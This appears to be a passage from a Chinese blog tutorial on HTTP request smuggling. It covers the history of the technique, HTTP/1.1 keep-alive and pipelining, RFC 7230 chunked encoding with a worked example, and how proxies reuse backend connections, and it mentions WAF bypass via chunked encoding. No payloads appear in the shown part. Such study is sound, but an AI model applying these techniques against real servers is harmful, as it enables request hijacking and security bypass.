VuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191205171217.jpeg" alt=""></p><p>Pic from <a href="https://twitter.com/SpiderSec/status/1200413390339887104?s=19" target="_blank" rel="noopener">https://twitter.com/SpiderSec/status/1200413390339887104?s=19</a></p><h1 id="TimeLine"><a href="#TimeLine" class="headerlink" title="TimeLine"></a>TimeLine</h1><p>在我们提 HTTP Smuggling 之前我们首先来看看其中的演变过程：</p><p>@Amit Klein 在 2004 年提出 <a href="https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf" target="_blank" rel="noopener">HTTP Response Splitting</a> 技术，是 HTTP Smuggling 攻击的雏形。</p><p>关于 HTTP Smuggling 这种攻击方式在 2005 年已由 @Watchfire 首次提出 <a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">HTTP Request Smuggling</a> 。</p><p>HTTP Parameter Pollution (HPP)，也就是 HTTP 参数污染，这其实也算是一种”特殊”的 HTTP Smuggling 攻击，在 2009 年由 @Stefano di Paola &amp; @Luca Carettoni 在 OWASP Poland conference 上首次提出，一经提出就引起了比较大的轰动，被广泛运用在绕过 WAF 当中。</p><p>2016 年 Defcon 24 ，@regilero 提出了 [Hiding Wookiees In Http]([<a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf]" target="_blank" rel="noopener">https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf]</a>(<a href="https://media.defcon.org/DEF" target="_blank" rel="noopener">https://media.defcon.org/DEF</a> CON 24/DEF CON 24 presentations/DEF CON 24 - Regilero-Hiding-Wookiees-In-Http.pdf))，进一步揭示了 HTTP Smuggling 这种攻击方式。</p><p>2019 年 Defcon 27， @James Kettle 提出了 [HTTP Desync Attacks: Smashing into the Cell Next Door]([<a href="https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-albinowax-HTTP-Desync-Attacks.pdf]" target="_blank" rel="noopener">https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-albinowax-HTTP-Desync-Attacks.pdf]</a>(<a href="https://media.defcon.org/DEF" target="_blank" rel="noopener">https://media.defcon.org/DEF</a> CON 27/DEF CON 27 presentations/DEFCON-27-albinowax-HTTP-Desync-Attacks.pdf))，讲解了如何用 HTTP Smuggling 技术挖掘到了 Paypal 的漏洞。</p><h1 id="Causes"><a href="#Causes" class="headerlink" title="Causes"></a>Causes</h1><p>然而@James Kettle 的 PPT 里面也并没有非常详细细致地讲述这个攻击是什么，以及怎么形成的，当初自己看完还是抱着非常大的疑惑的，后来学习了 @regilero 博客中关于 <a href="https://regilero.github.io/tag/Smuggling/" target="_blank" rel="noopener">HTTP Smuggling 的文章</a>，我才有了清晰的认识。</p><h2 id="HTTP-Connection-Mod"><a href="#HTTP-Connection-Mod" class="headerlink" title="HTTP Connection Mod"></a>HTTP Connection Mod</h2><blockquote><p>​    在<code>HTTP1.0</code>之前的协议设计中，客户端每进行一次HTTP请求，就需要同服务器建立一个TCP链接。而现代的Web网站页面是由多种资源组成的，我们要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种各样的资源，这样如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。于是在<code>HTTP1.1</code>中，增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p></blockquote><h3 id="Keep-Alive"><a href="#Keep-Alive" class="headerlink" title="Keep-Alive"></a>Keep-Alive</h3><p>根据 <a href="https://tools.ietf.org/html/rfc7230#section-6" target="_blank" rel="noopener">RFC7230</a> 我们可以知道</p><blockquote><p>​    HTTP/1.1 defaults to the use of “persistent connections”, allowing multiple requests and responses to be carried over a single connection.  The “close” connection option is used to signal that a connection will not persist after the current request/response.  HTTP implementations SHOULD support persistent connections.</p></blockquote><p>在 HTTP/1.1 中默认使用<code>Keep-Alive</code>，从而允许在单个连接上承载多个请求和响应。</p><blockquote><p>所谓<code>Keep-Alive</code>，就是在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在<code>HTTP1.1</code>中是默认开启的。</p></blockquote><p>当然，有些请求带着<code>Connection: close</code>的话，通信完成之后，服务器会中断 TCP 连接。</p><h3 id="Pipline"><a href="#Pipline" class="headerlink" title="Pipline"></a>Pipline</h3><blockquote><p>有了<code>Keep-Alive</code>之后，后续就有了<code>Pipeline</code>，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p><p>现如今，浏览器默认是不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。</p></blockquote><p>在 HTTP/1.1 中比较重要的引入就是 pipeline 技术了，以下是使用以及不使用 piepeline 技术的对比图：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191017234109.png" alt=""></p><p>我们可以清晰地看到，使用了 pipeline 之后不必再需要等待前一个请求完成其响应再处理第二个请求了，这个有点异步处理的意思在里面。</p><h2 id="Message-Body"><a href="#Message-Body" class="headerlink" title="Message Body"></a>Message Body</h2><p><a href="https://tools.ietf.org/html/rfc7230#section-3.3" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7230#section-3.3</a></p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><blockquote><p>​    Transfer-Encoding is analogous to the Content-Transfer-Encoding field of MIME, which was designed to enable safe transport of binary data over a 7-bit transport service ([RFC2045], Section 6).  However, safe transport has a different focus for an 8bit-clean transfer protocol. In HTTP’s case, Transfer-Encoding is primarily intended to accurately delimit a dynamically generated payload and to distinguish payload encodings that are only applied for transport efficiency or security from those that are characteristics of the selected resource.</p></blockquote><p>Transfer-Encoding 是一种被设计用来支持 7-bit 传输服务安全传输二进制数据的字段，有点类似于 MIME (Multipurpose Internet Mail Extensions) Header 中的 Content-Transfer-Encoding 。在HTTP的情况下，Transfer-Encoding 的主要用来以指定的编码形式编码 payload body 安全地传输给用户。在 HTTP/1.1 中引入，在 HTTP/2 中取消。</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank" rel="noopener">MDN</a> 列举了几种属性：</p><p></p><figure class="highlight coq hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunked | <span class="hljs-type">compress</span> | <span class="hljs-type">deflate</span> | <span class="hljs-type">gzip</span> | <span class="hljs-type">identity</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们这里主要关注 chunked 这一种传输编码方式，它在网络攻击中也不是第一次提及了，之前就有师傅利用这个字段去绕过一些 WAF，可以参考 <a href="https://www.freebuf.com/articles/web/194351.html" target="_blank" rel="noopener">利用分块传输吊打所有WAF</a>，也是比较有意思的 bypass 技巧。</p><p>我们可以在<a href="https://tools.ietf.org/html/rfc7230#section-4.1" target="_blank" rel="noopener">RFC7230</a>中查看到有关分块传输的定义规范。</p><blockquote><p>4.1.  Chunked Transfer Coding</p><p>   The chunked transfer coding wraps the payload body in order to<br>   transfer it as a series of chunks, each with its own size indicator,<br>   followed by an OPTIONAL trailer containing header fields.  Chunked<br>   enables content streams of unknown size to be transferred as a<br>   sequence of length-delimited buffers, which enables the sender to<br>   retain connection persistence and the recipient to know when it has<br>   received the entire message.</p><pre><code>chunked-body   = *chunk                 last-chunk                 trailer-part                 CRLFchunk          = chunk-size [ chunk-ext ] CRLF                 chunk-data CRLFchunk-size     = 1*HEXDIGlast-chunk     = 1*("0") [ chunk-ext ] CRLFchunk-data     = 1*OCTET ; a sequence of chunk-size octets</code></pre><p>   The chunk-size field is a string of hex digits indicating the size of<br>   the chunk-data in octets.  The chunked transfer coding is complete<br>   when a chunk with a chunk-size of zero is received, possibly followed<br>   by a trailer, and finally terminated by an empty line.</p><p>   A recipient MUST be able to parse and decode the chunked transfer<br>   coding.</p><p>4.1.1.  Chunk Extensions</p><p>   The chunked encoding allows each chunk to include zero or more chunk<br>   extensions, immediately following the chunk-size, for the sake of<br>   supplying per-chunk metadata (such as a signature or hash),<br>   mid-message control information, or randomization of message body<br>   size.</p><pre><code>chunk-ext      = *( ";" chunk-ext-name [ "=" chunk-ext-val ] )chunk-ext-name = tokenchunk-ext-val  = token / quoted-string</code></pre><p>   The chunked encoding is specific to each connection and is likely to<br>   be removed or recoded by each recipient (including intermediaries)<br>   before any higher-level application would have a chance to inspect<br>   the extensions.  Hence, use of chunk extensions is generally limited</p><p>   to specialized HTTP services such as “long polling” (where client and<br>   server can have shared expectations regarding the use of chunk<br>   extensions) or for padding within an end-to-end secured connection.</p><p>   A recipient MUST ignore unrecognized chunk extensions.  A server<br>   ought to limit the total length of chunk extensions received in a<br>   request to an amount reasonable for the services provided, in the<br>   same way that it applies length limitations and timeouts for other<br>   parts of a message, and generate an appropriate 4xx (Client Error)<br>   response if that amount is exceeded.</p></blockquote><p>这里如果你不想看的太仔细，我们只需要了解它是怎么一种结构就行了，这里也可以参考 <a href="https://en.wikipedia.org/wiki/Chunked_transfer_encoding" target="_blank" rel="noopener">Wiki: Chunked transfer encoding</a> ，比如说我们如果要使用 chunked 发送以下消息</p><p></p><figure class="highlight taggerscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wikipedia in<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>chunks.</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以这么去发送：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POSTT</span> <span class="hljs-string">/xxx</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: xxx</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/plain </span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">4\r\n</span></span><br><span class="line"><span class="hljs-attribute">Wiki\r\n</span></span><br><span class="line"><span class="hljs-attribute">5\r\n</span></span><br><span class="line"><span class="hljs-attribute">pedia\r\n</span></span><br><span class="line"><span class="hljs-attribute">e\r\n</span></span><br><span class="line"> in\r\n\r\nchunks.\r\n</span><br><span class="line"><span class="hljs-attribute">0\r\n</span></span><br><span class="line"><span class="hljs-attribute">\r\n</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里做个简单解释，<strong>我们使用<code>\r\n</code>表示 CRLF ，所以这里的<code>\r\n</code>是两个字节</strong>；第一个数字 4 表示的是接下来会有 4 个字节的数据，也就是 Wiki 这 4 个字母，然后按照 RFC 文档标准，字母 Wiki 部分后面需要跟<code>\r\n</code>表示 chunk-data 部分，数字 4 后面需要跟<code>\r\n</code>表示 chunk-size 部分，而且这个数字是个十六进制数，比如第三个数据，</p><p></p><figure class="highlight taggerscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br><span class="line">in<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>chunks.<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里第一个存在空格，数据当中的<code>\r\n</code>算两个字符，最后一个<code>\r\n</code>表示数据结束，这样的话，第一个空格 1 个字节 + in 2个字节 + 2 个 <code>\r\n</code> 算 4 个字节 + chunks. 7个字节 = 14 个字节，十六进制表示 14 也就是 e 。</p><p>最后一个<code>0\r\n\r\n</code>表示 chunk 部分结束。 </p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>本身这些东西是没有什么危害的，都是通过各种方式提高网络传输速率，但是在一些特殊的情况下就会出现了一些相应的安全问题。</p><blockquote><p>​    为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。这就有了一个很典型的拓扑结构。</p></blockquote><p>这里引用 @mengchen 师傅发的图：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191205171057.png" alt=""></p><p>一般来说，反向代理与后端服务器不会使用 pipeline 技术，甚至也不会去使用 Keep-Alive ，更多时候反向代理采取的措施是重用 TCP 链接，因为对于反向代理与后端服务器来说，反向代理服务器与后端服务器 IP 相对固定，不同用户的请求通过代理服务器与后端服务器建立链接，将这两者之间的 TCP 链接进行重用，也就顺理成章了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132520.png" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5H